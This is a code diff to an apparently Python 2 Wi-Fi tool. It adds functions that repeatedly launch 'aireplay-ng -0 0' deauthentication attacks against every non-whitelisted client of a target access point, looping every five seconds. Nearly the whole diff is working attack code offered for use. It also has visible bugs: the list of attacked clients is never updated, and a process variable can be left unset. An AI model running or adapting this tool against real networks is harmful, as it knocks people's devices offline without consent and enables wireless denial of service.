@@ -8,6 +8,8 @@ import sys
 import time
 
 args = None
+attack_clients = []
+attack_pids = []
 
 class apinfo:
 	bssid = None
@@ -120,6 +122,26 @@ def start_airodump(iface, channel, bssid):
 		sys.exit()
 	return p.pid, '/tmp/airodump-output'+ts+'-01.csv'
 
+# spawn a new aireplay instance to attack a specific client
+def spawn_attack(iface, c_bssid, ap_bssid):
+	try:
+		p = Popen(['aireplay-ng', '-0', '0', iface, '-c', c_bssid, '-a', ap_bssid, '--ignore-negative-one'], 
+				stdout=PIPE, stdin=PIPE, stderr=PIPE)
+	except OSError as e:
+		print e
+	return p.pid
+
+# start the attack by spawning instances for each client on the network that's not in the whitelist
+def start_attack(output, iface, bssid):
+	while True:
+		clients = get_clients(output)
+		diff = list(set(clients) - set(attack_clients))
+		for item in diff:
+			if item != bssid and item not in args.whitelist:
+				pid = spawn_attack(iface, item, bssid)
+				attack_pids.append(pid)
+		time.sleep(5)
+
 if __name__ == "__main__":
 	args = parse_args()
 	print "Bringing up interface \""+args.interface+"\"..."
@@ -143,4 +165,7 @@ if __name__ == "__main__":
 	print "Spawning airodump process..."
 	pid,output = start_airodump(mon, info.channel, info.bssid)
 	print "> airodump pid="+str(pid)+", writing to "+output
+	
+	print "Starting attack manager..."
+	start_attack(output, mon, info.bssid)
 	
